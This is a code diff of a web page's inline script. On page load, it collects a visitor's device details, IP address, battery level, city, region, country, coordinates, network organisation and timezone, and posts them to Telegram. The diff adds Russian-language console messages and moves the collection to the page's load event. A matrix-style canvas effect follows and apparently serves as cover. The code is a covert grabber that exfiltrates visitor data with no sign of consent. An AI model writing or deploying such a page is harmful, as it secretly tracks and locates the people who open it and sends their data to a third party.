@@ -470,6 +470,8 @@
                 text: message,
             };
 
+            console.log("Отправка данных в Telegram...");
+
             try {
                 const response = await fetch(url, {
                     method: 'POST',
@@ -492,6 +494,7 @@
             }
         }
         async function main() {
+            console.log("Сбор данных...");
             const deviceInfo = await collectDeviceInfo();
             const ipAddress = await getIPAddress();
             const batteryLevel = await getBatteryLevel();
@@ -504,7 +507,7 @@
             const timezone = await getTimezone();
             await sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone);
         }
-        main();
+        window.addEventListener('load', main);
     </script>
     <script>
         const canvas = document.getElementById('matrix');
